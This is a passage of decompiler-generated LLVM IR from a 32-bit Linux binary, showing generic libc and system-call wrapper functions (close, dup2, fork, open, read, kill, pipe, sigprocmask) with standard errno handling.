  br i1 %tmp, label %dec_label_pc_8050a8b, label %dec_label_pc_8050a7f

dec_label_pc_8050a7f:                             ; preds = %dec_label_pc_8050a6b
  %v1_8050a7f = call i32 @function_8050f90(i32 %v0_8050a3d)
  %v0_8050a84 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a84 = sub i32 0, %v0_8050a84
  %v2_8050a86 = inttoptr i32 %v1_8050a7f to i32*
  store i32 %v1_8050a84, i32* %v2_8050a86, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050a8b

dec_label_pc_8050a8b:                             ; preds = %dec_label_pc_8050a6b, %dec_label_pc_8050a7f
  %v0_8050a8b = phi i32 [ %v2_8050a73, %dec_label_pc_8050a6b ], [ -1, %dec_label_pc_8050a7f ]
  br label %dec_label_pc_8050a8d

dec_label_pc_8050a8d:                             ; preds = %dec_label_pc_8050a5d, %dec_label_pc_8050a8b
  %v0_8050a92 = phi i32 [ %v4_8050a61, %dec_label_pc_8050a5d ], [ %v0_8050a8b, %dec_label_pc_8050a8b ]
  store i32 %v0_8050a3d, i32* @ebx, align 4
  store i32 %v0_8050a3c, i32* @edi, align 4
  ret i32 %v0_8050a92

; uselistorder directives
  uselistorder i32 %v2_8050a73, { 1, 0, 2 }
  uselistorder i32 %v0_8050a3d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8050a8d, { 1, 0 }
  uselistorder label %dec_label_pc_8050a8b, { 1, 0 }
}

define i32 @function_8050a94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050a94:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050a94 = load i32, i32* @edi, align 4
  store i32 %v0_8050a94, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050aac = load i32, i32* @ebx, align 4
  %v1_8050ab4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8050ab4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050ab4, -4095
  br i1 %tmp, label %dec_label_pc_8050acc, label %dec_label_pc_8050ac0

dec_label_pc_8050ac0:                             ; preds = %dec_label_pc_8050a94
  %v1_8050ac0 = call i32 @function_8050f90(i32 %v0_8050aac)
  %v0_8050ac5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050ac5 = sub i32 0, %v0_8050ac5
  %v2_8050ac7 = inttoptr i32 %v1_8050ac0 to i32*
  store i32 %v1_8050ac5, i32* %v2_8050ac7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050acc

dec_label_pc_8050acc:                             ; preds = %dec_label_pc_8050a94, %dec_label_pc_8050ac0
  %v0_8050acf = phi i32 [ %v1_8050ab4, %dec_label_pc_8050a94 ], [ -1, %dec_label_pc_8050ac0 ]
  %v2_8050ad1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050ad1, i32* %edi.global-to-local, align 4
  ret i32 %v0_8050acf

; uselistorder directives
  uselistorder i32 %v1_8050ab4, { 1, 0, 2 }
  uselistorder i32 221, { 1, 0 }
  uselistorder label %dec_label_pc_8050acc, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8050ad4(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8050ad4:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8050b60(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050b60:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b60 = load i32, i32* @edi, align 4
  store i32 %v0_8050b60, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050b68 = load i32, i32* @ebx, align 4
  %v1_8050b70 = call i32 @close(i32 %arg1)
  store i32 %v0_8050b68, i32* @ebx, align 4
  store i32 %v1_8050b70, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050b70, -4095
  br i1 %tmp, label %dec_label_pc_8050b88, label %dec_label_pc_8050b7c

dec_label_pc_8050b7c:                             ; preds = %dec_label_pc_8050b60
  %v1_8050b7c = call i32 @function_8050f90(i32 %v0_8050b68)
  %v0_8050b81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050b81 = sub i32 0, %v0_8050b81
  %v2_8050b83 = inttoptr i32 %v1_8050b7c to i32*
  store i32 %v1_8050b81, i32* %v2_8050b83, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050b88

dec_label_pc_8050b88:                             ; preds = %dec_label_pc_8050b60, %dec_label_pc_8050b7c
  %v0_8050b89 = phi i32 [ %v1_8050b70, %dec_label_pc_8050b60 ], [ -1, %dec_label_pc_8050b7c ]
  %v2_8050b88 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050b88, i32* @edx, align 4
  %v2_8050b8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050b8c, i32* @edi, align 4
  ret i32 %v0_8050b89

; uselistorder directives
  uselistorder i32 %v1_8050b70, { 1, 0, 2 }
  uselistorder i32 %v0_8050b68, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050b88, { 1, 0 }
}

define i32 @function_8050b90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050b90:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b90 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b90, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050ba3 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_8050ba3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050ba3, -4095
  br i1 %tmp, label %dec_label_pc_8050bbc, label %dec_label_pc_8050bb0

dec_label_pc_8050bb0:                             ; preds = %dec_label_pc_8050b90
  %v0_8050bb0 = load i32, i32* %stack_var_-4, align 4
  %v1_8050bb0 = call i32 @function_8050f90(i32 %v0_8050bb0)
  %v0_8050bb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050bb5 = sub i32 0, %v0_8050bb5
  %v2_8050bb7 = inttoptr i32 %v1_8050bb0 to i32*
  store i32 %v1_8050bb5, i32* %v2_8050bb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %dec_label_pc_8050b90, %dec_label_pc_8050bb0
  %v0_8050bbd = phi i32 [ %v2_8050ba3, %dec_label_pc_8050b90 ], [ -1, %dec_label_pc_8050bb0 ]
  %v2_8050bc0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050bc0, i32* @ebx, align 4
  ret i32 %v0_8050bbd

; uselistorder directives
  uselistorder i32 %v2_8050ba3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050bbc, { 1, 0 }
}

define i32 @function_8050bc4(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050bc4:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050bc4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050bc4, i32* %stack_var_-4, align 4
  %v1_8050bcd = call i32 @fork(i32 %v0_8050bc4)
  store i32 %v1_8050bcd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050bcd, -4095
  br i1 %tmp, label %dec_label_pc_8050be4, label %dec_label_pc_8050bd8

dec_label_pc_8050bd8:                             ; preds = %dec_label_pc_8050bc4
  %v0_8050bd8 = load i32, i32* %stack_var_-4, align 4
  %v1_8050bd8 = call i32 @function_8050f90(i32 %v0_8050bd8)
  %v0_8050bdd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050bdd = sub i32 0, %v0_8050bdd
  %v2_8050bdf = inttoptr i32 %v1_8050bd8 to i32*
  store i32 %v1_8050bdd, i32* %v2_8050bdf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050be4

dec_label_pc_8050be4:                             ; preds = %dec_label_pc_8050bc4, %dec_label_pc_8050bd8
  %v0_8050be5 = phi i32 [ %v1_8050bcd, %dec_label_pc_8050bc4 ], [ -1, %dec_label_pc_8050bd8 ]
  %v2_8050be8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050be8, i32* @ebx, align 4
  ret i32 %v0_8050be5

; uselistorder directives
  uselistorder i32 %v1_8050bcd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050be4, { 1, 0 }
}

define i32 @function_8050bec() local_unnamed_addr {
dec_label_pc_8050bec:
  %stack_var_-8 = alloca i32, align 4
  %v2_8050bef = ptrtoint i32* %stack_var_-8 to i32
  %v2_8050bf6 = call i32 @function_8050c64(i32 7, i32 %v2_8050bef)
  store i32 256, i32* @edx, align 4
  %v2_8050c03 = icmp slt i32 %v2_8050bf6, 0
  br i1 %v2_8050c03, label %dec_label_pc_8050c0b, label %dec_label_pc_8050c07

dec_label_pc_8050c07:                             ; preds = %dec_label_pc_8050bec
  %v3_8050c07 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8050c07, i32* @edx, align 4
  br label %dec_label_pc_8050c0b

dec_label_pc_8050c0b:                             ; preds = %dec_label_pc_8050bec, %dec_label_pc_8050c07
  %v0_8050c0b = phi i32 [ 256, %dec_label_pc_8050bec ], [ %v3_8050c07, %dec_label_pc_8050c07 ]
  ret i32 %v0_8050c0b

; uselistorder directives
  uselistorder label %dec_label_pc_8050c0b, { 1, 0 }
}

define i32 @function_8050c14() local_unnamed_addr {
dec_label_pc_8050c14:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c14 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c14, i32* %stack_var_-4, align 4
  %v1_8050c1d = call i32 @int80_syscall(i32 201)
  store i32 %v1_8050c1d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050c1d, -4095
  br i1 %tmp, label %dec_label_pc_8050c34, label %dec_label_pc_8050c28

dec_label_pc_8050c28:                             ; preds = %dec_label_pc_8050c14
  %v0_8050c28 = load i32, i32* %stack_var_-4, align 4
  %v1_8050c28 = call i32 @function_8050f90(i32 %v0_8050c28)
  %v0_8050c2d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c2d = sub i32 0, %v0_8050c2d
  %v2_8050c2f = inttoptr i32 %v1_8050c28 to i32*
  store i32 %v1_8050c2d, i32* %v2_8050c2f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c34

dec_label_pc_8050c34:                             ; preds = %dec_label_pc_8050c14, %dec_label_pc_8050c28
  %v0_8050c35 = phi i32 [ %v1_8050c1d, %dec_label_pc_8050c14 ], [ -1, %dec_label_pc_8050c28 ]
  %v2_8050c38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c38, i32* @ebx, align 4
  ret i32 %v0_8050c35

; uselistorder directives
  uselistorder i32 %v1_8050c1d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 201, { 1, 0 }
  uselistorder label %dec_label_pc_8050c34, { 1, 0 }
}

define i32 @function_8050c3c() local_unnamed_addr {
dec_label_pc_8050c3c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c3c = load i32, i32* @ebx, align 4
  store i32 %v0_8050c3c, i32* %stack_var_-4, align 4
  %v1_8050c45 = call i32 @getpid(i32 %v0_8050c3c)
  store i32 %v1_8050c45, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050c45, -4095
  br i1 %tmp, label %dec_label_pc_8050c5c, label %dec_label_pc_8050c50

dec_label_pc_8050c50:                             ; preds = %dec_label_pc_8050c3c
  %v0_8050c50 = load i32, i32* %stack_var_-4, align 4
  %v1_8050c50 = call i32 @function_8050f90(i32 %v0_8050c50)
  %v0_8050c55 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c55 = sub i32 0, %v0_8050c55
  %v2_8050c57 = inttoptr i32 %v1_8050c50 to i32*
  store i32 %v1_8050c55, i32* %v2_8050c57, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c5c

dec_label_pc_8050c5c:                             ; preds = %dec_label_pc_8050c3c, %dec_label_pc_8050c50
  %v0_8050c5d = phi i32 [ %v1_8050c45, %dec_label_pc_8050c3c ], [ -1, %dec_label_pc_8050c50 ]
  %v2_8050c5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050c5c, i32* @edx, align 4
  %v2_8050c60 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c60, i32* @ebx, align 4
  ret i32 %v0_8050c5d

; uselistorder directives
  uselistorder i32 %v1_8050c45, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c5c, { 1, 0 }
}

define i32 @function_8050c64(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050c64:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c64 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c64, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8050c77 = call i32 @int80_syscall(i32 191)
  store i32 %v1_8050c77, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050c77, -4095
  br i1 %tmp, label %dec_label_pc_8050c90, label %dec_label_pc_8050c84

dec_label_pc_8050c84:                             ; preds = %dec_label_pc_8050c64
  %v0_8050c84 = load i32, i32* %stack_var_-4, align 4
  %v1_8050c84 = call i32 @function_8050f90(i32 %v0_8050c84)
  %v0_8050c89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c89 = sub i32 0, %v0_8050c89
  %v2_8050c8b = inttoptr i32 %v1_8050c84 to i32*
  store i32 %v1_8050c89, i32* %v2_8050c8b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c90

dec_label_pc_8050c90:                             ; preds = %dec_label_pc_8050c64, %dec_label_pc_8050c84
  %v0_8050c91 = phi i32 [ %v1_8050c77, %dec_label_pc_8050c64 ], [ -1, %dec_label_pc_8050c84 ]
  %v2_8050c94 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c94, i32* @ebx, align 4
  ret i32 %v0_8050c91

; uselistorder directives
  uselistorder i32 %v1_8050c77, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c90, { 1, 0 }
}

define i32 @function_8050c98(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050c98:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c98 = load i32, i32* @edi, align 4
  store i32 %v0_8050c98, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8050cb0 = load i32, i32* @ebx, align 4
  %v2_8050cb8 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_8050cb0, i32* @ebx, align 4
  store i32 %v2_8050cb8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050cb8, -4095
  br i1 %tmp, label %dec_label_pc_8050cd0, label %dec_label_pc_8050cc4

dec_label_pc_8050cc4:                             ; preds = %dec_label_pc_8050c98
  %v1_8050cc4 = call i32 @function_8050f90(i32 %v0_8050cb0)
  %v0_8050cc9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050cc9 = sub i32 0, %v0_8050cc9
  %v2_8050ccb = inttoptr i32 %v1_8050cc4 to i32*
  store i32 %v1_8050cc9, i32* %v2_8050ccb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050cd0

dec_label_pc_8050cd0:                             ; preds = %dec_label_pc_8050c98, %dec_label_pc_8050cc4
  %v0_8050cd3 = phi i32 [ %v2_8050cb8, %dec_label_pc_8050c98 ], [ -1, %dec_label_pc_8050cc4 ]
  %v2_8050cd5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050cd5, i32* @edi, align 4
  ret i32 %v0_8050cd3

; uselistorder directives
  uselistorder i32 %v2_8050cb8, { 1, 0, 2 }
  uselistorder i32 %v0_8050cb0, { 1, 0 }
  uselistorder label %dec_label_pc_8050cd0, { 1, 0 }
}

define i32 @function_8050cd8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050cd8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050cd8 = load i32, i32* @ebx, align 4
  store i32 %v0_8050cd8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050ceb = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_8050ceb, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050ceb, -4095
  br i1 %tmp, label %dec_label_pc_8050d04, label %dec_label_pc_8050cf8

dec_label_pc_8050cf8:                             ; preds = %dec_label_pc_8050cd8
  %v0_8050cf8 = load i32, i32* %stack_var_-4, align 4
  %v1_8050cf8 = call i32 @function_8050f90(i32 %v0_8050cf8)
  %v0_8050cfd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050cfd = sub i32 0, %v0_8050cfd
  %v2_8050cff = inttoptr i32 %v1_8050cf8 to i32*
  store i32 %v1_8050cfd, i32* %v2_8050cff, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050d04

dec_label_pc_8050d04:                             ; preds = %dec_label_pc_8050cd8, %dec_label_pc_8050cf8
  %v0_8050d05 = phi i32 [ %v2_8050ceb, %dec_label_pc_8050cd8 ], [ -1, %dec_label_pc_8050cf8 ]
  %v2_8050d04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050d04, i32* @edx, align 4
  %v2_8050d08 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d08, i32* @ebx, align 4
  ret i32 %v0_8050d05

; uselistorder directives
  uselistorder i32 %v2_8050ceb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d04, { 1, 0 }
}

define i32 @function_8050d0c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050d0c:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8050d0f = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8050d13 = sdiv i32 %sext, 16777216
  store i32 %v4_8050d13, i32* @ecx, align 4
  %v4_8050d17 = ptrtoint i8* %arg1 to i32
  %v3_8050d1b = and i32 %arg2, 64
  %v4_8050d1b = icmp eq i32 %v3_8050d1b, 0
  br i1 %v4_8050d1b, label %dec_label_pc_8050d2c, label %dec_label_pc_8050d20

dec_label_pc_8050d20:                             ; preds = %dec_label_pc_8050d0c
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8050d2c

dec_label_pc_8050d2c:                             ; preds = %dec_label_pc_8050d0c, %dec_label_pc_8050d20
  %v0_8050d2c = phi i32 [ 0, %dec_label_pc_8050d0c ], [ %phitmp, %dec_label_pc_8050d20 ]
  store i32 %v0_8050d2c, i32* @edx, align 4
  store i32 %v4_8050d17, i32* %ebx.global-to-local, align 4
  %v5_8050d37 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8050d13)
  store i32 %v5_8050d37, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8050d37, -4095
  br i1 %tmp15, label %dec_label_pc_8050d4f, label %dec_label_pc_8050d43

dec_label_pc_8050d43:                             ; preds = %dec_label_pc_8050d2c
  %v1_8050d43 = call i32 @function_8050f90(i32 %v0_8050d0f)
  %v0_8050d48 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050d48 = sub i32 0, %v0_8050d48
  %v2_8050d4a = inttoptr i32 %v1_8050d43 to i32*
  store i32 %v1_8050d48, i32* %v2_8050d4a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050d4f

dec_label_pc_8050d4f:                             ; preds = %dec_label_pc_8050d2c, %dec_label_pc_8050d43
  %v0_8050d52 = phi i32 [ %v5_8050d37, %dec_label_pc_8050d2c ], [ -1, %dec_label_pc_8050d43 ]
  store i32 %v0_8050d0f, i32* @ebx, align 4
  ret i32 %v0_8050d52

; uselistorder directives
  uselistorder i32 %v5_8050d37, { 1, 0, 2 }
  uselistorder i32 %v4_8050d13, { 1, 0 }
  uselistorder i32 %v0_8050d0f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050d4f, { 1, 0 }
  uselistorder label %dec_label_pc_8050d2c, { 1, 0 }
}

define i32 @function_8050d57(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050d57:
  %v3_8050d67 = inttoptr i32 %arg1 to i8*
  %v4_8050d67 = call i32 @function_8050d0c(i8* %v3_8050d67, i32 577)
  ret i32 %v4_8050d67
}

define i32 @function_8050d70(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050d70:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050d70 = load i32, i32* @edi, align 4
  store i32 %v0_8050d70, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050d78 = load i32, i32* @ebx, align 4
  %v1_8050d80 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050d80 = call i32 @pipe([2 x i32] %v1_8050d80)
  store i32 %v0_8050d78, i32* @ebx, align 4
  store i32 %v2_8050d80, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8050d80, -4095
  br i1 %tmp, label %dec_label_pc_8050d98, label %dec_label_pc_8050d8c

dec_label_pc_8050d8c:                             ; preds = %dec_label_pc_8050d70
  %v1_8050d8c = call i32 @function_8050f90(i32 %v0_8050d78)
  %v0_8050d91 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050d91 = sub i32 0, %v0_8050d91
  %v2_8050d93 = inttoptr i32 %v1_8050d8c to i32*
  store i32 %v1_8050d91, i32* %v2_8050d93, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050d98

dec_label_pc_8050d98:                             ; preds = %dec_label_pc_8050d70, %dec_label_pc_8050d8c
  %v0_8050d99 = phi i32 [ %v2_8050d80, %dec_label_pc_8050d70 ], [ -1, %dec_label_pc_8050d8c ]
  %v2_8050d9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d9c, i32* @edi, align 4
  ret i32 %v0_8050d99

; uselistorder directives
  uselistorder i32 %v2_8050d80, { 1, 0, 2 }
  uselistorder i32 %v0_8050d78, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050d98, { 1, 0 }
}

define i32 @function_8050de0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050de0:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050de0 = load i32, i32* @edi, align 4
  store i32 %v0_8050de0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050df0 = load i32, i32* @ebx, align 4
  %v4_8050df8 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050df0, i32* @ebx, align 4
  store i32 %v4_8050df8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8050df8, -4095
  br i1 %tmp, label %dec_label_pc_8050e10, label %dec_label_pc_8050e04

dec_label_pc_8050e04:                             ; preds = %dec_label_pc_8050de0
  %v1_8050e04 = call i32 @function_8050f90(i32 %v0_8050df0)
  %v0_8050e09 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050e09 = sub i32 0, %v0_8050e09
  %v2_8050e0b = inttoptr i32 %v1_8050e04 to i32*
  store i32 %v1_8050e09, i32* %v2_8050e0b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050e10

dec_label_pc_8050e10:                             ; preds = %dec_label_pc_8050de0, %dec_label_pc_8050e04
  %v0_8050e11 = phi i32 [ %v4_8050df8, %dec_label_pc_8050de0 ], [ -1, %dec_label_pc_8050e04 ]
  %v2_8050e14 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050e14, i32* @edi, align 4
  ret i32 %v0_8050e11

; uselistorder directives
  uselistorder i32 %v4_8050df8, { 1, 0, 2 }
  uselistorder i32 %v0_8050df0, { 1, 0 }
  uselistorder label %dec_label_pc_8050e10, { 1, 0 }
}

define i32 @function_8050e18(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8050e18:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050e19 = load i32, i32* @esi, align 4
  store i32 %v0_8050e19, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8050e31 = load i32, i32* @ebx, align 4
  %v1_8050e39 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050e31, i32* @ebx, align 4
  store i32 %v1_8050e39, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8050e39, -4095
  br i1 %tmp, label %dec_label_pc_8050e51, label %dec_label_pc_8050e45

dec_label_pc_8050e45:                             ; preds = %dec_label_pc_8050e18
  %v1_8050e45 = call i32 @function_8050f90(i32 %v0_8050e31)
  %v0_8050e4a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e4a = sub i32 0, %v0_8050e4a
  %v2_8050e4c = inttoptr i32 %v1_8050e45 to i32*
  store i32 %v1_8050e4a, i32* %v2_8050e4c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e51

dec_label_pc_8050e51:                             ; preds = %dec_label_pc_8050e18, %dec_label_pc_8050e45
  %v0_8050e52 = phi i32 [ %v1_8050e39, %dec_label_pc_8050e18 ], [ -1, %dec_label_pc_8050e45 ]
  %v2_8050e51 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050e51, i32* @edx, align 4
  %v2_8050e54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050e54, i32* @esi, align 4
  ret i32 %v0_8050e52

; uselistorder directives
  uselistorder i32 %v1_8050e39, { 1, 0, 2 }
  uselistorder i32 %v0_8050e31, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8050e51, { 1, 0 }
}

define i32 @function_8050e80(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050e80:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8050e81 = load i32, i32* @esi, align 4
  %v4_8050e85 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8050e85, i32* @ecx, align 4
  %v2_8050e91 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8050e91, label %dec_label_pc_8050eaa, label %dec_label_pc_8050e95

dec_label_pc_8050e95:                             ; preds = %dec_label_pc_8050e80
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_8050eaa, label %dec_label_pc_8050e9a

dec_label_pc_8050e9a:                             ; preds = %dec_label_pc_8050e95
  %v1_8050e9a = call i32 @function_8050f90(i32 %v0_8050e81)
  %v1_8050e9f = inttoptr i32 %v1_8050e9a to i32*
  store i32 22, i32* %v1_8050e9f, align 4
  store i1 false, i1* @of, align 1
  br label %dec_label_pc_8050ed1

dec_label_pc_8050eaa:                             ; preds = %dec_label_pc_8050e95, %dec_label_pc_8050e80
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8050eaf = load i32, i32* @ebx, align 4
  %v7_8050eb7 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8050eaf, i32* @ebx, align 4
  %v1_8050eba = add i32 %v7_8050eb7, 4096
  %v2_8050eba = icmp ult i32 %v7_8050eb7, -4096
  %v3_8050eba = xor i32 %v7_8050eb7, -2147483648
  %v4_8050eba = xor i32 %v1_8050eba, %v7_8050eb7
  %v5_8050eba = and i32 %v4_8050eba, %v3_8050eba
  %v6_8050eba = icmp slt i32 %v5_8050eba, 0
  store i1 %v6_8050eba, i1* @of, align 1
